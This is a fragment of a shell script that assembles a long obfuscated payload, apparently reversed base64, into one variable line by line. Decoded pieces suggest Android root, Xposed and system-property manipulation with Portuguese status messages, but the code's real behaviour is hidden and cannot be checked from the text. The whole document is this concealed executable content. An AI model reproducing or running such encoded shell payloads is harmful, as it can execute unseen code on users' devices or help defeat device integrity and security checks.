+_c+='NViOIVCIkVSLtVyKnAyJ5FGZgETLnACZtASZ0FGZoQSPlNmbpN3XgACIgogCpZGIgACIKISfOtHJ'
+_c+='pM3b0FGZgEWrD7WZ0BybuByc0FGdzlnclRHdhJGKgkHdpZXa0NWZu52bjByc5NHctVHZgEWrDbHI'
+_c+='vRWYyVGc1NWZyBCbhlmcvR3cphEIdpyW9J0ekICI0VHc0V3bfd2bsBCIgACIgACIK4WZoRHI70FI'
+_c+='ikyJdpTZjFGczpzWnACZtAic0BCfgICVT5USOVFJiAyboNWZoQiIgoXLgsFImYCIdBiIpcSX6U2Y'
+_c+='hB3c6s1JgQWLgIHdgwHIiQ1UOlkTV9lTO90QkICIvh2YlhCJiAibtAyWgYWagACIgogI950ekwWY'
+_c+='pJ3b0NXaoBiblBychN3boNWZwN3bzBycwBXYg4WaTBSXTyp4b13R7RiIgQXdwRXdv91ZvxGImYCI'
+_c+='dBCMgEXZtASVfRkTV9kRkAyWgACIgoQamBCIgAiCiQ1UOlkTV9FTMFEJiACP8wDIl52bkBCIgACI'
+_c+='gACIKkmZgACIgACIgACIgACIKETPV9FROV1TGByOpkyKrQlTV90QfNVVPl0QJB1UVNFKoAyOi0nT'
+_c+='7RyZrBHJgoTYkFGbhR3cul2clRGIhN3boNWZwN3bzBCcwFEIdFyW9l1ekICI0VHc0V3bfd2bsBCI'
+_c+='gACIgACIgACIgACIgAiCuVGa0ByOiQXazNXYwxHdjVmaulGfzNXYwlnY8t2YhhGf0FWZoNGfr92b'
+_c+='oxXYklmcmxHajRXYwFGf1NHbl5mcltGfkV2cvBHe8t2cpdWYtJCIFlWctACclJ3ZgwHIic2awRiI'
+_c+='g8GajVGImlGIgACIgACIgACIgAiClVnbpRnbvNGImYCIdBiIntGckICI61CIbBCIgACIgACIgACI'
+_c+='gowbkByOntGcgIXLgQWYlJHIlxWaodHIgACIgACIgogblhGdgsTXgICVT5USOV1XMxUQkICIu1CI'
+_c+='bBiZpBCIgAiCw0TVfRkTV9kRgACIgoQK11CI0J3bzBCfgcCJedCI21CIwVmcnBCfgICVT5USOV1X'
+_c+='O50TDRiIgICVT5USOVFJiAyJzVibcNXJnAiZ05WayBHKk0DVT5USOV1XMxUQgACIgogCpUXLgQnc'
+_c+='vNHI8ByJ9xiM7liKd9VOtAjWtEketE2WdpVLBpXLhtlLchiKd9VOtAjWtEketE2WdpVLBpXLht1J'
+_c+='gU0btACclJ3ZgwHIicVQS9FVT5USOV1XO50TDRiIg8GajVGKk0DVT5USOV1XO50TDBCIgAiCpcic'
+_c+='cdCIk1CIyRHI8BiInY3btVmc/4SZnF2ajFGc8RURMxUQUNlTJ5UVnASRp1CIwVmcnBCfgwGb152L'
+_c+='2VGZv4jMgkHdpZXa0NWZu52bjByc5NHctVHZiACbsVGazBiYkFGKk0zVBJ1XUNlTJ5UVf5kTPNEI'
+_c+='gACIK4ibvJXZpRmclBHIhlHIz9GZgMXYyR3bgMXYsBSZ1FHIzVmbvl2YhxWY0NnbpNXZkBichN2c'
+_c+='lBHIhJXYwBSZ05WZpRmblBXZk5WagUGduVWdmBSYyV2YyVGdg8WbvNGIjACIgAiCh1WdzBSZzBCl'
+_c+='AKOI0F2Yn9GbvMHdhR3c5JXZ0RXYiBSZkBCbhByb05Wa0NXakBCLuN7wpNWY09mcgUGZg8Gbjl2Y'
+_c+='g8Waw9mcwBSdzBibvNGIpQUSVBicvBHIkVmcgUGZgMCIgACIKMXYjlGdtOMbvBHIlRGIhpXZpBXb'
+_c+='pxGKgM3bklmdv1WZyByclRXZ1FXYwBSZkBCbhlmcvR3cphGIvlGcvJHcgU3cgEGZyFWdnBSe0lmd'
+_c+='pR3Yl5mbvNGIzl3cw1WdkByIgACIgogCpciccdCIk1CIyRHI8BiI11CI0J3bzBCfgciIcdCIk1CI'
+_c+='yRHI8ByJiw1KdJCXetlIcdCIF9WLgAXZydGI8ByJiw1KdJCXetlIcpzKdlTLwsVPulmb1d2awdCI'
+_c+='F9WLgAXZydGI8BCbsVnbvYXZk9iPyAyc0FGdzlnclRHdhJGIzl3cw1WdkJCIsxWZoNHIiRWYoQSP'
+_c+='UNlTJ5UVgACIgogITFERBxUQUNlTJNVREByUBN1TINURQN1TTByUQBVQiAickh2XjV2cgACIgowe'
+_c+='gkCKzBHch9FZlxGbhR3culmb191ajVGajpgC9pgIiAyboNWZgACIgoQamBCIgAiCi0nT7RyLiRWY'
+_c+='vEGdhR2Lg4WZgM3bkFmclB3cl5WagM3bzV2YvJHcg4WaTBSXTyp4b13R7RiIgQXdwRXdv91ZvxGI'
+_c+='gACIgACIgoQZzxWZgACIgoQKpITPrQlTV90QfNVVPl0QJB1UVNFKoACIgACIgACIKUmbvRGI7ISf'
+_c+='OtHJl5WasRCIg0XW7RiIgQXdwRXdv91ZvxGImYCIdBiIl5WasRiIg4WLgsFIvRGI7UmbpxGIy1CI'
+_c+='kFWZyBSZslGa3BCfgIyUD9kUQ9lQEF0XBRVQERiIg8GajVGIgACIgACIgogI950ekozLiRWYvEGd'
+_c+='hR2LgUGZzVGZgM3bzV2YvJHUg0VIb1nU7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGdgsTXgISK'
+_c+='n0lOlNWYwNnObdCIk1CIyRHI8BiITN0TSB1XCRUQfFEVBREJiAyboNWZoQiIg4WLgsFImlGIgACI'
+_c+='KkyJyx1JgQWLgIHdgwHInUTLgQWYlhGI8BCbsVnbvYXZk9iPyASZu9GZgszYhNXZgszOiwGJgoTf'
+_c+='lhXZvUSJmtHJiAyboNWZgkiKvIGZh9SY0FGZvAyO7UWdulGdu92YgkiKkBXYq8iYkF2LhRXYk9Cf'
+_c+='qQ2azl2Zh1mKvIGZh9SY0FGZvwnKkV3crpyLiRWYvEGdhR2Lg4WagICbkICIlNXYjByOpwGb152L'
+_c+='2VGZv4jMgIiZkICIr5WasRWYlJHKk0Dbg8GZgsTZ4V2Lq0VOtAzWvM2byB3Lg4WagYGIy9mZnACb'
+_c+='sVGazBiYkFGKk0zUD9kUQ9lQEF0XBRVQEBCIgAiCKkmZgACIgoQZu9GZgsjI950ekwGJgASfXtHJ'
+_c+='iACd1BHd192Xn9GbgYiJg0FIiwGJiAibtAyWg8GZgsDbgIXLgQWYlJHIlxWaodHI8BiIUNVSI9lQ'
+_c+='EF0XTNVRMVkUJdFJiAyboNWZgACIgACIgAiCi0nT7RiOp8GbvNHItO8cgI3bwBybz9GajVGcz92c'
+_c+='g8WbvNGIhRnblV3Yg8mbgwybjlmci1WoDzWYulGICRUQgE2c1Bicl5mbhN2cg8Waw9mcwBCblBCl'
+_c+='AKOIvZXa0FWby9mZulGKg82YpJnYtF6wsFmbpBiQEFEIlRGIuN7wpNWY2lGdjFGIlRGIsFWay9Gd'
+_c+='zlGSg0lKb1nQ7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGdgsTXgISKn0lOlNWYwNnObdCIk1CI'
+_c+='yRHI8BiIUNVSI9lQEF0XTNVRMVkUJdFJiAyboNWZoQiIg4WLgsFImlGIgACIKkyJyx1JgQWLgIHd'
+_c+='gwHIiUTLgQWYlhGI8ByJn5WaylWYwpiLiRWY8dUVCVERfN1UFxURSl0V8lmZpd3XiRWYnASRp1CI'
+_c+='wVmcnBCfgwGb152L2VGZv4jMgkncvR3cphGIzR3chNGZh9mciBSe0lmdpR3YhByc5NHctVHZiACb'
+_c+='sVGazBiYkFGKk0DVTlESfJERB91UTVETFJVSXBCIgAiCKkmZgACIgoQZu9GZgsjI950ekUmbpxGJ'
+_c+='gASfXtHJiACd1BHd192Xn9GbgYiJg0FIiUmbpxGJiAibtAyWg8GZgsTZulGbgIXLgQWYlJHIlxWa'
+_c+='odHI8BiIH9ETfV0SPZVRS9lQTVFJiAyboNWZgACIgACIgAiCiEGZhR3Yl52bjByb2VHdzVGIDBFI'
+_c+='pOcdxBSZkBybyR3chJHIsVGIyFmcy9mYgEmchBHIlNnchNXdgUGZlVHcgI3bkFGbs9mcyF2clRGI'
+_c+='lRGIzVGdzVnaBBSZkNXZkBiQEFEIzVmbvl2YhpXay9Gd1FGIyF2YvZXZSJCI4R3YfBCIgACIgACI'
+_c+='KISfOtHJ6QXYjd2bsBiblBiQEFEIuN7wpNWYj9mdlJHIlRGIz9GduVmdFBSXqsVfZtHJiACd1BHd'
+_c+='192Xn9GbgACIgACIgAiCuVGa0ByOdBiIpcSX6U2YhB3c6s1JgQWLgIHdgwHIic0TM9VRL9kVFJ1X'
+_c+='CNVVkICIvh2YlhCJiAibtAyWgYWagACIgoQKwETLgwWahRHI8ByJsxWZoNHIiRWY8RXYjd2bsxHZ'
+_c+='iRWYnASR21CIwVmcnBCfgciccdCIk1CIyRHI8BiInkSZr9mdl1lcStFf0NWZu52bjNXaE52booiL'
+_c+='yV2Zh5WYNdmbpd2Z1JWZEJGZBxnYkFmKukCZlZ3btVmc8RWZyFWZsNGKq4yPzlXZrxXK6lmcvhGd'
+_c+='1Fmb1x3avZXZyhiKuIGZhdCIFlWLgAXZydGI8BCbsVnbvYXZk9iPyACMwUDI01CIk1CIl1Wa0Bid'
+_c+='tACdhN2ZvxmIgwGblh2cgIGZhhCJ9c0TM9VRL9kVFJ1XCNVVgACIgogLCRUQg42sDn2YhpXay9Gd'
+_c+='1FGIlRGIsFWZyBibzOcajF2YvZXZyBSYuVHIlRGIz92YpZWrDPWZwNXZg42bzBSZ1FHIz9GduVmd'
+_c+='lBibhN2c1JGIjACIgAiClNHIvx2bzBSYy9GaBBiLz9WZuF2YzVGIz9GbgM3bk9Gdgk2chNGIuVGI'
+_c+='hJWYyFGczlGZgkHIpIERBBicvBHIlN3bk5WoDT3Yl52bjBicl5mbhN2cg8Waw9mcwBCblByIgACI'
+_c+='goALzVmbvl2YhNWamlGdv5GIskmZpdHKgEWblR3cpNHIsVGZgwWYtJ3buBCZhRWa2lGdjFGIyVWa'
+_c+='1FHbhV3YgUGduVWbhNWa0NWoDLHcgEmc1RHchNGIvNXZgoDdhN2ZvxGIjACIgAiClRGIzFWZu16w'
+_c+='sBCMwUDIzFWbpRHb6OMIzFGbgEmc052bjByJ0NWZu52bjNXakxHdjVmbu92Y8V2YpZXZkxHc01Gf'
+_c+='iNXdnASYiFWZoNGdh1GIvR3clByclRnbBByIgACIgogCpZGIgACIKISfOtHJp8GdzVGIuFmcl5WZ'
+_c+='nBibpOcai1WY0ByclxWYtJ3buBycl52bphXZu92YlJHIUCo4g8mdpRXYtJ3bm5WaoAyclZXYsNGI'
+_c+='lRGIhJXd0NWZsBSZkBycvxGbhZGIMlUQG9FRBVkUfJERBRCI6IXZnFmbh10Zul2ZnVnYlRkYkFEI'
+_c+='dpyW9l1ekICI0VHc0V3bfd2bsBCIgACIgACIK4WZoRHI7wGb152L2VGZv4jMg0FI2ACdn1CIi0HM'
+_c+='toDTJFkRfRUQFJ1XCRUQ7RiIgsFImlGIgACIKkCMg8GajVGI8xHIsxWdu9idlR2L+IDIiQWZslWY'
+_c+='mBCZhVmUq4icldWYuFWTn5WandWdiVGRiRWQiAyYtACclJ3ZgwHIiUESDF0Qfd0TMRiIg8GajVGK'
+_c+='k0DTJFkRfRUQFJ1XCRUQgACIgogCpZGIgACIKkSKz0zKU5UVPN0XTV1TJNUSQNVVThCKgACIgACI'
+_c+='gAiCl52bkByOi0nT7RCZpBHJgoDRJBFIg0XW7RiIgQXdwRXdv91ZvxGImYCIdBiIklGckICIu1CI'
+_c+='bBybkByOklGcgIXLgQWYlJHIlxWaodHI8BiITRUSQ9FUXRkSkICIvh2YlBCIgACIgACIKIyb2lmd'
+_c+='g4WZg82ZlVnagwWZkBybzV2YvJHcgwWZkBSYpJ3btVWbgIXYjlmZpR2btBSegIXYu9WajNWZwNnb'
+_c+='pBSYyFGcgE2c1BSZzBClAKOIl1Wa05WdyBiblBSY2FmSgIXZndWdiVGZg4WdgIXY05WdqRWYgUGd'
+_c+='p1mclBHIQdFRKJCI4R3YfBCIgACIgACIKISfOtHJ6M1TWlEVDFEIFxkQBd0RVJURE1CUXRkSgM1T'
+_c+='TV0QPJFUg0VIb1nU7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGdgsTXgISKn0lOlNWYwNnObdCI'
+_c+='k1CIyRHI8BiITRUSQ9FUXRkSkICIvh2YlhCJiAibtAyWgYWagACIgoQKnIHXnACZtAic0BCfgwGb'
+_c+='152L2VGZv4jMgA3dkpGIiRWYgIDI0V3bl1Wa0hCJ9MFRJB1XQdFRKBCIgAiCKkmZgACIgogI950e'
+_c+='kkSaml2dgI3bwBSZ0NXYl5WYjNXZgk2cgUGbiFmclB3clhCIzVGdzVnaBBiblBSYkFGdpxWaiFGa'
+_c+='gE2YpJnYtF6wsFmbpBibzOcajFmc1BXZEBSXqsVfCtHJiACd1BHd192Xn9GbgACIgACIgAiCuVGa'
+_c+='0ByOdBiIxICI9AiIH5USURVRT9VSGl0VfJERBRiIgsFImlGIgACIKkyJyx1JgQWLgIHdgwHIiwGb'
+_c+='152L2VGZv4jMgQWZsJWYuV2XpZWa39lYkFGIsFmYvx2ZgQXZnBycn5Wa0RXZzJCIsxWZoNHIiRWY'
+_c+='oQSPH5USURVRT9VSGl0VfJERBBCIgAiCpZGIgACIKkSKy0zKU5UVPN0XTV1TJNUSQNVVThCKgACI'
+_c+='gACIgAiCi8GZuFGajV3YzVGIhOMdzVGIvNWayJWbhOMbh5WagIERBBSZkBichRmbhOMdzVGIvRnc'
+_c+='lVHcgwWZgUWdxBSKw9mcwRXZnBSZkBychOcblRWYoASYtOsdgEGZuV3ZlNHIy9GcgEWbylmZu92Q'
+_c+='iACe0N2XgACIgACIgAiCi0nT7RSKuxWd01CIzNHKg8EVSVUSCFEI1UTN1AyTUJVRVBFIdFyW9J1e'
+_c+='kICI0VHc0V3bfd2bsBCIgACIgACIK4WZoRHI70FIikyJdpTZjFGczpzWnACZtAic0BCfgISN1UTN'
+_c+='fN1UkICIvh2YlhCJiAibtAyWgYWagACIgoQKnIHXnACZtAic0BCfgIyJ1UTN1ozJgAXZydGI8BCb'
+_c+='sVnbvYXZk9iPyAibsVHdtAyczJCIsxWZoNHIiRWYoQSP1UTN181UTBCIgAiCpZGIgACIKkSKy0zK'
+_c+='U5UVPN0XTV1TJNUSQNVVThCKgACIgACIgAiCi8mdpRXaz9GczlGZgwWYg82YpNXrDbGIvNXZjNWY'
+_c+='g4WazBycr92boBichdWZsB3clRGIvByc0VHculGIyFGdjVWeulGIhJXYwBSYzVHIlNHIUCo4gUGb'
+_c+='iF2Yg4WazByb09WblJHIs9mc052bjBSZ0lWbyVGcgAVSvA1QUBicvBHICRUQiACe0N2XgACIgACI'
+_c+='gAiCi0nT7RSKUJ1TQ9FUDR1XCRUQkACUDRFIvRnclVHcoAyTWlEVDFEIPNUSSJUTBOMTB5USgIER'
+_c+='BBSXhsVfStHJiACd1BHd192Xn9GbgACIgACIgAiCuVGa0ByOdBiIx0iIg0TIgICVS9EUfB1QU9lQ'
+_c+='EFEJiAyWgYiJg0FIiQlUPB1XQNEVfJERBRiIg4WLgsFImlGIgACIKkyJyx1JgQWLgIHdgwHIiwGb'
+_c+='152L2VGZv4jMgQncvBnLwNGduIGZh5SZjlmdyV2cgA3byBHdldmIgwGblh2cgIGZhhCJ9QlUPB1X'
+_c+='QNEVfJERBBCIgAiCKISfOtHJ99GZpN2bu92YzVGZtoTRUFEVT9lQTV1ek03V7RCI6UGdhR3cgI0U'
+_c+='VBSXqsVfCtHJiACd1BHd192Xn9GbgACIgoQKnIHXnACZtAic0BCfgICbsVnbvYXZk9iPyASZ0FGd'
+_c+='z5iYzVnLzl3cgA3byBHdldmIgwGblh2cgIGZhhCJ9UEVBR1UfJ0UVBCIgAiCi8EVP1URSBCTPJFV'
+_c+='O90Qg8CICRUQgMVRO9USYVkTPNkIgIHZo91YlNHIgACIKsHIpgycu9Wa0NWZu52bj9lYkF2XrNWZ'
+_c+='oNmCK0nCiICIvh2YlBCIgAiCpZGIgACIKISfOtHJpU2cyFGdjVmbvNGIhJXYwBicl5mbhN2cgwWZ'
+_c+='gE2c1BSZ1FHIvRnclVHcg8WbzlWbgwWZgMXZgwSaml2dgI3bwBSZ0NXYl5WYjNXZgk2cgQJgiDyb'
+_c+='2lGdh1mcvZmbphCIwFWbuBib6O8ZlNHIvRncllmYhBiQEFEIvRnclVHUg0lKb1nQ7RiIgQXdwRXd'
+_c+='v91ZvxGIgACIgACIgogblhGdgszJuVGcvtSXdpTZjFGczpzWbB3Y09SfysXX50CMbVTNedCIFFXL'
+_c+='gAXZydGI8BiIUV1TfBVQN5EJiAyboNWZgYWagACIgoQZu9GZgsjI950ekUmbpxGJgASfXtHJiACd'
+_c+='1BHd192Xn9GbgYiJg0FIiUmbpxGJiAibtAyWg8GZgsTZulGbgIXLgQWYlJHIlxWaodHI8BiIUV1T'
+_c+='fBVQN5EJiAyboNWZgACIgoQKsxWdu9idlR2L+IDIiAVSfRVRHJVQURiIgY1ctACMwYTNtADM1UDI'
+_c+='w1CIwFWbuBCM5ACd19WZtlGdoQSPUV1TfBVQN5EIgACIKISfOtHJu4iLpMXZsF2YvxGIzt2bvhGI'
+_c+='y9Gcg8GZhV2csFmZgIXZzBSZkVWdwBybuBCLsFWZyBCZlJHIlRGIsVmdp5GIhBSYjlmZpJXZ2hCI'
+_c+='WNXLgADM2UTLwATN1ACctACch1mbg01Kb1nQ7RiIgQXdwRXdv91ZvxGIgACIKISfOtHJQl0XUV0R'
+_c+='SFEVk03V7RCI68mdpRXaz9GczlGZgwWZkBCUJBSXqsVfCtHJiACd1BHd192Xn9GbgACIgoQamBCI'
+_c+='gAiCuJXd0VmcgACIgACIgAiCiICIvh2YlBCIgACIgACIKISfOtHJlRXat9GIlNHIUCo4gkyPhRXd'
+_c+='yBibpNHIvBybkF2ZhBXYgkmRpd1vCjCIvZXa0l2cvB3cpRGIsVGZgAVSgEGbgIXZuVGdi9GIvRWd'
+_c+='wBSZzBybOBSXqsVfZtHJiACd1BHd192Xn9GbgACIgACIgAiCuVGa0ByOdBiIQl0XUV0RSFEVkICI'
+_c+='61CIbBiZpBCIgAiCpETLgQWYlhGI8ByJ9JDJgQnbpJHc7dCIrdXYgwHInsSXukTLwsFI0VmbpdCI'
+_c+='F9WLgAXZydGI8ByJyx1JgQWLgIHdgwHIiwGb152L2VGZv4jMgAjbhx2dgc3boNHIyRGZhBCcpJCI'
+_c+='sxWZoNHIiRWYoQSPQl0XUV0RSFEVgYiJg0FIiAVSfRVRHJVQURiIgoXLgsFIgACIKkyJ9JDJgQnb'
+_c+='pJHc7dCIrdXYgwHInsSXukTLwsFIjJ3cnASRv1CIwVmcnBCfgciccdCIk1CIyRHI8BiIsxWdu9id'
+_c+='lR2L+IDIx4SMuEjLxACdldGIlRXdvJHIwlmIgwGblh2cgIGZhhCJ9AVSfRVRHJVQUBCIgAiCpZGI'
+_c+='gACIK4mc1RXZyBCIgACIgACIKIiIg8GajVGIgACIgACIgogI950ek8mbyVGd4VGIvVmbhN2clBCb'
+_c+='lBSZ0lWbvBSZzBClAKOIwFWbuBichxWY0NnbpBybkVHcgU2cg8mTg0VIb1nU7RiIgQXdwRXdv91Z'
+_c+='vxGIgACIgACIgogblhGdgsTMm4jMgwGb152L2VGZv4DIwFWbuBidtACZuFWbt92YgECImlGIgACI'
+_c+='KkmZgACIgoQMm4jMgwGb152L2VGZv4DIwFWbuBSetACbsFGdz5Wagc2awBCIgACIgACIKISfOtHJ'
+_c+='u4iLvRmbhxWY0NnbpBCLvRWYsFGdz5Wag8mbgAXYt5GIdpyW9l1ekICI0VHc0V3bfd2bsBCIgACI'
+_c+='gACIK4WZoRHI7EjJ+IDIsxWdu9idlR2L+ACch1mbgYXLgQmbh1WbvNGIhAiZpBCIgAiCikCUB1kT'
+_c+='oAyUPRlUFVFUgUERg8kTSVEVYVEIPVkTBN0UFJCIyRGafNWZzBCIgAiC7BSKo4WYjNHdy9GcfBXY'
+_c+='t52XrNWZoNmCK0nCiICIvh2YlBCIgAiCpZGIgACIKISfOtHJpZULpdFI5h3byBHIul2Ug01kcK+W'
+_c+='9d0ekICI0VHc0V3bfd2bsBCIgACIgACIKU2csVGIgACIKkSKy0zKU5UVPN0XTV1TJNUSQNVVThCK'
+_c+='gsjI950ekkFWPJFUflkRJdFJgozbkFmc1dWam52bjBSaG1SaXBSe49mcQBSXhsVfStHJiACd1BHd'
+_c+='192Xn9GbgACIgACIgAiCuVGa0ByOi0FbsVnbet1Ku0TZ1xWY2JCIFFXLgAXZydGI8BiIZh1TSB1X'
+_c+='JZUSXRiIg8GajVGImlGIgACIKkyJyx1JgQWLgIHdgwHIiwGb152L2VGZv4jMgQ3cvh2X5h3byB3X'
+_c+='pZWa39CbhJ2bsd2LzdmbpRHdlN3LvoDduVGdu92Ygkmc11SLgknclVXcgQnblRnbvNmIgwGblh2c'
+_c+='gIGZhhCJ9kFWPJFUflkRJdFIgACIKISfOtHJu4iLpZULpdFI5h3byBHIvRmbhNWamlmclZFIdtyW'
+_c+='9J0ekICI0VHc0V3bfd2bsBCIgAiCpZGIgACIKISfOtHJQRFVIBSe49mcwBibpNFIdNJnivVfHtHJ'
+_c+='iACd1BHd192Xn9GbgACIgACIgAiClNHblBCIgAiCpkiM9sCVOV1TD91UV9USDlEUTV1UogCI7ISf'
+_c+='OtHJZh1TSB1XQRFVIRCI6AFVUhEIZh1TSBFIdFyW9J1ekICI0VHc0V3bfd2bsBCIgACIgACIK4WZ'
+_c+='oRHI70FIiAjOiASPhAiIZh1TSB1XQRFVIRiIgsFImYCIdBiIsxWduJCI9ECIikFWPJFUfBFVUhEJ'
+_c+='iAyWgYiJg0FIikFWPJFUfBFVUhEJiAibtAyWgYWagACIgoQKnIHXnACZtAic0BCfgICbsVnbvYXZ'
+_c+='k9iPyASe49mcw9Fc0RHagwWYi9GbnBCdldGIzdmbpRHdlNnIgwGblh2cgIGZhhCJ9kFWPJFUfBFV'
+_c+='UhEIgACIKISfOtHJu4iLQRFVIBSe49mcwBybk5WYjlmZpJXZWBSXrsVfCtHJiACd1BHd192Xn9Gb'
+_c+='gACIgoQamBCIgAiCi0nT7RSYklmcGBycvRnclVHcg4WaTBSXTyp4b13R7RiIgQXdwRXdv91ZvxGI'
+_c+='gACIgACIgoQZzxWZgACIgoQKpMTPrQlTV90QfNVVPl0QJB1UVNFKoACIgACIgACIKUmbvRGI7ISf'
+_c+='OtHJl5WasRCIg0XW7RiIgQXdwRXdv91ZvxGImYCIdBiIl5WasRiIg4WLgsFIvRGI7UmbpxGIy1CI'
+_c+='kFWZyBSZslGa3BCfgICVS9EUfFERJJlRkICIvh2YlBCIgACIgACIKIyb05WZp1WY0J3bw12bjBic'
+_c+='hNWamlGZv1GIhJXYwBCbhVmcg8GctVWa0BiblBSZylmRgUWZyZEIlRGIzVmbvl2YuVnZgEWZr92b'
+_c+='oBClAKOIhNWatF6wulGZg42sDn2YhRnbl1WdyR3culGIlRGIrJ3b3VWbhJnZgMXZgEGZpJnRiACe'
+_c+='0N2XgACIgACIgAiCi0nT7RiOOVEVTlETg4URgEERJJlRgM1TUJVRVBFIdFyW9J1ekICI0VHc0V3b'
+_c+='fd2bsBCIgACIgACIK4WZoRHI70FIikyJdpTZjFGczpzWnACZtAic0BCfgICVS9EUfFERJJlRkICI'
+_c+='vh2YlhCJiAibtAyWgYWagACIgoQKz0CIkFWZoBCfgcCIBBDInASRtACclJ3ZgwHInASKzIUO2wnM'
+_c+='CljNoozJgUUatACclJ3ZgwHIiUESDF0QfB1QURiIg8GajVGKk0DVS9EUfFERJJlRgACIgogI950e'
+_c+='k4iLukyM0AzNy8iM0AzNygCIhRWayZEIz9GdyVWdwBybk5WYjlmZpJXZWBSXrsVfCtHJiACd1BHd'
+_c+='192Xn9GbgACIgogITF0UPh0QFB1UPNFITVkTPlEWF50TDBSWgM1TUJVRVBlIgIHZo91YlNHIgACI'
+_c+='KsHIpgyc0J3bw91ay92d0Vmbft2Ylh2YKoQfKIiIg8GajVGIgACIKISfOtHJzF2cvh2YlB3cvNHI'
+_c+='zBHchBibpNFIdNJnivVfHtHJiACd1BHd192Xn9GbgYiJg0FIwAScl1CIQNVVT9FROV1TGRCIbBCI'
+_c+='gAiCKkmZgACIgoQM9A1UVN1XE5UVPZEI7kSKz0zKU5UVPN0XTV1TJNUSQNVVThCKgACIgACIgAiC'
+_c+='l52bkByOi0nT7RCbkACI9l1ekICI0VHc0V3bfd2bsBiJmASXgICbkICIu1CIbBybkByOsBictACZ'
+_c+='hVmcgUGbph2dgwHIz0CIkFWZoBCfgICRFt0QBJ1QkICIvh2YlBCIgACIgACIKISfOtHJ68ERBR1Q'
+_c+='FRVREByTEF0QJZUSE9UTv8ERBV0SDFkUDBySQFEIdFyW9J1ekICI0VHc0V3bfd2bsBCIgACIgACI'
+_c+='K4WZoRHI70FIikyJdpTZjFGczpzWnACZtAic0BCfgICRFt0QBJ1QkICIvh2YlhCJiAibtAyWgYWa'
+_c+='gACIgoQKnIHXnACZtAic0BCfgIyJkV2cvB3csxHZlRGZv1GfkV2ajFmcjdCIFlWLgAXZydGI8BCb'
+_c+='sVnbvYXZk9iPyAyRLB1XF1UQHRCIw1WdkBSbwJCIsxWZoNHIiRWYoQSPEV0SDFkUDBCIgAiCi0nT'
+_c+='7RiLu4ybkFWZrNWYyNGILBVQgUGZgMXZy9GZhNWak5Wag8GZuF2YpZWayVmVg01Kb1nQ7RiIgQXd'
+_c+='wRXdv91ZvxGIgACIKoQZu9GZgACIgoQamBCIgACIgACIKkmZgACIgACIgACIgACIKETPQNVVT9FR'
+_c+='OV1TGByOpkyM9sCVOV1TD91UV9USDlEUTV1UogCIgACIgACIgACIgACIgACIKUmbvRGI7ISfOtHJ'
+_c+='h9FJgASfZtHJiACd1BHd192Xn9GbgYiJg0FIiE2XkICIu1CIbBybkByOh9FIy1CIkFWZyBSZslGa'
+_c+='3BCfgICczV3cfN3awF2XkICIvh2YlBCIgACIgACIgACIgACIgAiCi0nT7RiOoRXYw91av9GafRCI'
+_c+='uVGIzRXYlh2YgEGIvRWYpN2bzFGIlJnYt9mbg42bjBySQFEIdFyW9J1ekICI0VHc0V3bfd2bsBCI'
+_c+='gACIgACIgACIgACIgAiCuVGa0ByOdBiIwNXdz91crBXYfRiIg4WLgsFImlGIgACIgACIgACIgAiC'
+_c+='pcicldWYuFWb01GfyV2Zh5WYt9Fdtx3ajFmcjxnbldWeltGfk9WbrBXY8hHNoZmZ8RWZkR2btx3c'
+_c+='k9Wb8JGXk9WbixFfrNXanFWb8RWZz9Gc4xHZlN3bwNHb8JXZwBXYydHf0NWZq5Wa8R3bi1WahxnY'
+_c+='cB3clJGX8t2YhhGbsF2d8t2YhhGf0FWZoN2JgUUatACclJ3ZgwHIiM3awF2XkICIvh2YlhCJ9A3c'
+_c+='1N3XztGch9FIgACIgACIgACIgAiCl52bkByOi0nT7RSYfRCIg03V7RiIgQXdwRXdv91ZvxGImYCI'
+_c+='dBiIh9FJiAibtAyWg8GZgsTYfBictACZhVmcgUGbph2dgwHIiM3awF2XkICIvh2YlBCIgACIgACI'
+_c+='gACIgogI950ekoDa0FGcft2bvh2XkAiblByclRnblNXZyBHIztEUBBSXqsVfCtHJiACd1BHd192X'
+_c+='n9GbgACIgACIgACIgACIK4WZoRHI70FIiM3awF2XkICIu1CIbBiZpBCIgACIgACIKkyJrBXYuI3b'
+_c+='0lmbv1WLud3butmb1dCI21CIwVmcnBCfgciccdCIk1CIyRHI8BiIsxWdu9idlR2L+IDInsGch5iK'
+_c+='nASZtFmbtAyJoRXYw91av9GafRyJgQmbpZmIgwGblh2cgIGZhhCJ9M3awF2XgACIgACIgAiCvRGI'
+_c+='7ICZh9Gbud3bE9CZyF2YkN3LiAiIw1GdvwWYj9GbvEGdhR2LiAibpBCa0FGcft2bvh2XgI3bmBCI'
+_c+='gAiCkJXYjR2cvASegAXb09CbhN2bs9SY0FGZvAiblByav9GagUGZgM3SQFEIlRGIzFWbylmZgIXY'
+_c+='jlmZpJXZ2BiOpM1UyVGbsV2SoAyMg8GZvRXqD3EIjACIgAiCl52bkBCIgAiCpZGIgACIgACIgoQM'
+_c+='9IVRQBVQSd1XE5UVPZEI7ETPQNVVT9FROV1TGByOpkCN9sCVOV1TD91UV9USDlEUTV1UogCIgACI'
+_c+='gACIgACIgAiCi0nT7RCZuV3bm9lZo9FJgoTY0VnUgASfZtHJiACd1BHd192Xn9GbgACIgACIgACI'
+_c+='gACIKISZylmRgUWZyZEIlRGIuN7wpNmb1ZGIyVWa1FHbhV3YgIXYjlmZpR2btBiblRWZ1BHIoNGd'
+_c+='hBVQvQWZz9GcY9CZlN3bQNFTgQJgiDSYtVGdzl2cg4WZgsmcvdXZtFmcmByav9GagUGZgEWrDLXZ'
+_c+='yJWaMJCI4R3YfBCIgACIgACIgACIgogI950ekUGbpZ2Xr92bo9FJgozbkFGdjVGdlRGIrJ3b3VWb'
+_c+='hJnZgs2bvhGIlRGIvZXaoNmcBBSXhsVfStHJiACd1BHd192Xn9GbgACIgACIgACIgACIK4WZoRHI'
+_c+='70FIiQmb19mZfZGafRiIg4WLgsFImlGIgACIgACIgoQKnIHXnACZtAic0BCfgISMtACZhVGagwHI'
+_c+='sxWdu9idlR2L+IDInUGbpZ2Xr92bo9FJnASZtFmbtAyLwBXYvEGdhR2LgQmbpZmIgwGblh2cgIGZ'
+_c+='hhCJ9Qmb19mZfZGafBCIgACIgACIK8GZgsjIvNnLoNGdhBXYilGbiAiIvNnLkVncpJnYpxmIgIyb'
+_c+='z5CduFGbwNHbilGbiAiIvNnLrNXanlneilGbiAiIvNnLkV2cvBHWkVkYpxmIgIybz5CdyF2XkV2c'
